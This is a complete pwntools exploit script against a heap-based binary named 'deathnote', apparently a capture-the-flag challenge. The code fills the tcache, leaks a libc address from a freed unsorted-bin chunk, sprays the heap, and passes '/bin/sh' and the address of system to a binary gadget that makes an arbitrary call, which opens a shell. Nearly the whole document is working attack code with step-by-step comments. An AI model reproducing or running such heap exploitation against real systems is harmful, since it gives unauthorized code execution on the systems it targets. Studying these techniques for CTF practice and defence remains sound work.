#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("deathnote", checksec=True)
libc = elf.libc
#context.log_level = "debug"
context.log_level = "critical"

gs = """
b _
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()


class ProgramInteraction:
    @staticmethod
    def add(size, indx, data):
        io.sendlineafter("💀 ", b"1")
        io.sendlineafter("💀 ", str(size).encode())
        io.sendlineafter("💀 ", str(indx).encode())
        io.sendlineafter("💀 ", data)

    @staticmethod
    def free(indx):
        io.sendlineafter("💀 ", b"2")
        io.sendlineafter("💀 ", str(indx).encode())

    @staticmethod
    def show(indx) -> int:
        io.sendlineafter("💀 ", b"3")
        io.sendlineafter("💀 ", str(indx).encode())
        io.recvuntil(b"Page content: ")
        leak = io.recvline().strip()
        leak = u64(leak.ljust(8, b"\x00"))
        return leak

    


if __name__ == "__main__":
    program = ProgramInteraction()
    for i in range(8):                    # allocate 9 chunks 
        program.add(0x80, i, b"A"*0x80)   # this will be to fill up tcache, the next freed chunk of this size will be unsortedbin due to tunable being adjusted

    program.add(0x10, 8, b"B"*0x10)       # anti top chunk consolidation

    # cause chunk overlapping
    for i in range(7):                    # free all 7 chunks
        program.free(i)                   # free the tcache, next chunk freed with same size will be fastbin

    program.free(7)                       # free victim chunk


    unsortedbin = program.show(7)
    libc.address = unsortedbin - 0x21ace0               # unsortedbin leak - offset from libc
    log.info(f"rebased libc @ {libc.address:08x}")


    for i in range(5):                           # heap spray
        program.add(0x80, 0, chr(0x41+i) * 8)    # so now we can control RDI and RDX

    """
00001939  488b45d8           mov     rax, qword [rbp-0x28 {argument_one}]    # the chunk at which our /bin/sh string lives
0000193d  4883c008           add     rax, 0x8                                # adds 0x8 to RAX so its pointing to the user data
00001941  488b00             mov     rax, qword [rax]                        # derefrences whats at RAX and moves it back into RAX
00001944  488b55f0           mov     rdx, qword [rbp-0x10 {address2call}]    # where address hex string is

00001948  4889c7             mov     rdi, rax  # mov RAX into RDI so that we can control arg1 of whatever function we call
0000194b  ffd2               call    rdx       # this is our arbitrary call where we get to call whatever address is inside of RDX
0000194d  90                 nop     
    """
    program.add(0x80, 0, b"/bin/sh")                # /bin/sh into RDI
    program.add(0x80, 0, hex(libc.sym.system)[2:])  # send system as a hex string for the arbitrary call
    io.sendlineafter(b" ",b"42")                    # get shell
    io.interactive()
